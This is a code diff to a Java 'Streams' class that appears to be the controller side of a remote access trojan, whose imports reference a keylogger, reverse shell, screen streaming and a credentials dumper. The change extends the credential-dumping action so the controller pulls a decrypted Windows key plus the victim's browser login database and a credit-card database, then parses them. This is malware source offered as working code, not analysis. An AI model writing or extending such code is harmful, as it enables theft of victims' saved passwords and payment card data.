@@ -2,8 +2,8 @@ package Connections;
 
 
 import GUI.TableUtils.Connection.ConnectionEnum;
-import GUI.TableUtils.CrendentialsDumper.Credentials;
-import GUI.TableUtils.CrendentialsDumper.CredentialsDumper;
+import GUI.TableUtils.CreditCardsCredentials.CredentialsDumper;
+import GUI.TableUtils.CreditCardsCredentials.Packets.CombinedCredentials;
 import GUI.TableUtils.KeyLogger.KeyloggerEvents;
 import GUI.TableUtils.Permissions.Permissions;
 import GUI.TableUtils.ReverseShell.Shell;
@@ -11,27 +11,14 @@ import GUI.TableUtils.ScreenStreaming.Screen;
 import GUI.TableUtils.SystemState.State;
 import Information.*;
 
-import java.util.Date;
-
 
 import Information.Action;
 import org.json.JSONObject;
 
 
-import javax.crypto.*;
-import javax.crypto.spec.GCMParameterSpec;
-import javax.crypto.spec.SecretKeySpec;
 import javax.swing.*;
 import java.io.*;
 import java.net.Socket;
-import java.nio.charset.StandardCharsets;
-import java.security.InvalidAlgorithmParameterException;
-import java.security.InvalidKeyException;
-import java.security.NoSuchAlgorithmException;
-import java.sql.DriverManager;
-import java.sql.ResultSet;
-import java.sql.SQLException;
-import java.sql.Statement;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
@@ -92,7 +79,7 @@ public class Streams {
     }
 
     @SuppressWarnings("ResultOfMethodCallIgnored")
-    public void receiveFile(String path) throws IOException {
+    public String receiveFile(String path) throws IOException {
         String fileName = readString();
         File filePath = new File(path + "\\" + fileName);
         filePath.getParentFile().mkdirs();
@@ -130,6 +117,7 @@ public class Streams {
 
         System.out.println("File "
                 + " downloaded (" + total + " bytes read)");
+        return filePath.toString();
 
     }
 
@@ -190,7 +178,7 @@ public class Streams {
     }
 
     public byte[] receiveBytesForCryptography() throws IOException {
-        int size = mainStream.readSize();
+        int size = readSize();
         byte[] buffer = new byte[size];
         dis.readFully(buffer);
         return buffer;
@@ -252,15 +240,17 @@ public class Streams {
         return null;
     }
 
-    public List<Credentials> getCredentials(Action action, String command) throws IOException {
+    public CombinedCredentials getCredentials(Action action, String dbPath) throws IOException {
         JSONObject jsonObject = new JSONObject();
         switch (action) {
             case DUMP_CREDENTIALS -> {
                 jsonObject.put("action", 15);
                 mainStream.sendString(jsonObject.toString());
-                byte[] array = receiveBytesForCryptography();
-                receiveFile(command);
-                return new CredentialsDumper().getListOfCredentials(array, command + "/" + "Login Data");
+                byte[] decryptedWINKey = receiveBytesForCryptography();
+                String accountsDB = receiveFile(dbPath);
+                String creditCardsDB = receiveFile(dbPath);
+                CredentialsDumper credentialsDumper = new CredentialsDumper(decryptedWINKey, accountsDB, creditCardsDB);
+                return credentialsDumper.getCredentials();
             }
         }
         return null;
